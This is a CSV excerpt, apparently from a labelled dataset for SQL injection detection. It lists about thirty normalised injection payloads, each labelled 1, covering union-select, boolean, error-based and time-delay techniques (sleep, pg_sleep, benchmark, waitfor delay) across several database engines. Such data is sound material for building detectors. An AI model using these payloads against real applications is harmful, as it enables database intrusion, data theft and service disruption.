row_index,payload_norm,label,sqli_type_hint
9930,"-6924' ) union all select 2046,2046,2046,2046,2046,2046,2046--",1,
9931,"-2901"" or elt ( 9866 = 9099,9099 ) and ""asib"" like ""asib",1,
9932,-6500' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'padu' like 'padu,1,
9933,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",1,
9934,"1 ) as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",1,
9935,"1%' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
9936,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),1,
9937,select ( case when ( 2830 = 7046 ) then 2830 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
9938,"1'+ ( select 'ixza' where 4374 = 4374 union all select null,null,null--",1,
9939,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'dzzx' = 'dzzx",1,
9940,"1 ) union all select null,null,null,null,null,null,null,null--",1,
9941,-3677' ) ) or 1939 = 4484,1,
9942,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nbsr' like 'nbsr",1,
9943,"-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,1,
9944,"1%' ) ) ) union all select null,null,null,null,null--",1,
9945,"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'cxor' = 'cxor",1,
9946,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1,
9947,"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # zwck",1,
9948,"1%' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '",1,
9949,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( '%' = '",1,
9950,-9393' where 3119 = 3119 or 8571 = 8571--,1,
9951,"1'+ ( select 'ixvd' where 4772 = 4772 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1,
9952,"-8506' ) ) ) union all select 1950,1950,1950,1950,1950,1950--",1,
9953,1 and sleep ( 5 ) #,1,
9954,1'+ ( select yjtm where 3965 = 3965 and 9389 = 3443,1,
9955,"-3505"" ) or 5290 = 3436--",1,
9956,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'knhm' = 'knhm",1,
9957,"1' where 4245 = 4245 union all select null,null--",1,
9958,1 ) ) as rbcf where 1053 = 1053,1,
9959,"1"" ) ) as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",1,
